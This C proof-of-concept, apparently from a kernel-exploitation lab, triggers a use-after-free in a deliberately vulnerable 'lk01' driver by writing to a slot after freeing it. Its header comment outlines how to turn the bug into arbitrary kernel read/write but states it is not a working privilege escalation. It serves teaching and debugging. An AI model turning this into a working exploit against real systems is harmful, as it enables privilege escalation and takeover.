/*
 * lk01_expl - use-after-free demonstrator for the lk01 driver.
 *
 * lk01 is a slot-based object manager (ALLOC/WRITE/READ/FREE). LK01_FREE releases the object but
 * leaves the slot's pointer dangling, so writing or reading the same slot after a FREE is a
 * use-after-free. This PoC drives that path: allocate a slot, free it, then write to it again.
 * On a KASAN kernel (--profile exploit-dev,kasan) the second write raises a use-after-free report;
 * on a plain kernel it silently corrupts freed memory (debug it with the breakpoints in the
 * walkthrough). This is a starting point for a real exploit (reclaim the freed slab with a
 * controlled object, then the dangling slot is an arbitrary read/write), NOT a working LPE.
 */

#include <fcntl.h>
#include <stdint.h>
#include <stdio.h>
#include <string.h>
#include <sys/ioctl.h>
#include <unistd.h>

/* Must mirror the kernel-side struct lk01_req in lk01.c exactly (same layout and size). */
struct lk01_req {
	uint32_t idx;
	uint32_t len;
	void *buf;
};

#define LK01_ALLOC _IOW('L', 1, struct lk01_req)
#define LK01_FREE _IOW('L', 2, struct lk01_req)
#define LK01_WRITE _IOW('L', 3, struct lk01_req)
#define LK01_READ _IOR('L', 4, struct lk01_req)

static int lk01(int fd, unsigned long cmd, unsigned int idx, unsigned int len, void *buf)
{
	struct lk01_req r = {.idx = idx, .len = len, .buf = buf};

	return ioctl(fd, cmd, &r);
}

int main(void)
{
	char buf[128];
	int fd = open("/dev/lk01", O_RDWR);

	if (fd < 0) {
		perror("[!] open /dev/lk01");
		return 1;
	}

	printf("[*] ALLOC slot 0 (%zu bytes)\n", sizeof(buf));
	if (lk01(fd, LK01_ALLOC, 0, sizeof(buf), NULL) < 0) {
		perror("[!] alloc");
		return 1;
	}

	memset(buf, 'A', sizeof(buf));
	printf("[*] WRITE slot 0 (valid)\n");
	lk01(fd, LK01_WRITE, 0, sizeof(buf), buf);

	printf("[*] FREE slot 0 (the slot pointer is left dangling)\n");
	lk01(fd, LK01_FREE, 0, 0, NULL);

	memset(buf, 'B', sizeof(buf));
	printf("[*] WRITE slot 0 AGAIN, this is the use-after-free\n");
	printf("[*] on a KASAN kernel this raises a use-after-free report; if you read past here, it did not fault\n");
	lk01(fd, LK01_WRITE, 0, sizeof(buf), buf);

	close(fd);
	return 0;
}
